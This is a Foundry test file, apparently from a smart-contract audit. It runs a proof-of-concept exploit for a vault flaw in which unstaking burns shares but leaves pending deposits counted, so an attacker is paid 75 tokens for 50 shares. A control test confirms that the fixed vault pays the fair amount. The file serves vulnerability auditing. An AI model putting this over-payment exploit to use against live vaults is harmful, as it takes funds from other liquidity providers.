// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    Mini,
    CabalVaultFixed,
    LpUser
} from "./56895-h-01-lp-unstaking-only-burns-the-shares-but-leaves-the-under.sol";

contract Finding56895Test is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_exploit_unstake_pays_75_for_50_shares() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.sharesAfterB(), 100 ether, "shares left are A's 100");
        assertEq(e.underlyingAfterB(), 150 ether, "underlying still includes B's pending 50");
        assertEq(e.pendingAfterB(), 50 ether, "B's 50 is pending");
        assertEq(e.fairAmount(), 50 ether, "A unstakes 50 shares");
        assertEq(e.unbondingSeen(), 75 ether, "75 unbonded instead of 50");
        assertEq(e.paidToA(), 75 ether, "A is paid 75");
        assertEq(e.leftForRemaining(), 25 ether, "only 25 left for A's remaining 50 shares");
        assertEq(Mini(address(e.token())).balanceOf(ATTACKER), 75 ether, "attacker received 75");
    }

    function test_control_subtracts_pending() public {
        Mini token = new Mini();
        CabalVaultFixed vault = new CabalVaultFixed(token);
        LpUser userB = new LpUser();
        token.mint(address(userB), 50 ether);
        token.mint(address(this), 100 ether);
        token.approve(address(vault), 100 ether);
        userB.stakeFixed(vault, token, 50 ether);
        vault.process_lp_stake(100 ether);
        userB.unstakeFixed(vault, 50 ether);

        uint256 unbonding = vault.process_lp_unstake(50 ether);
        assertEq(unbonding, 50 ether, "fixed unbonding is 50");
        vault.batch_undelegate_pending_lps(address(this), address(userB));
        assertEq(token.balanceOf(address(this)), 50 ether, "caller paid 50");
        assertEq(token.balanceOf(address(vault)), 50 ether, "remaining 50 shares still backed 1:1");
    }
}
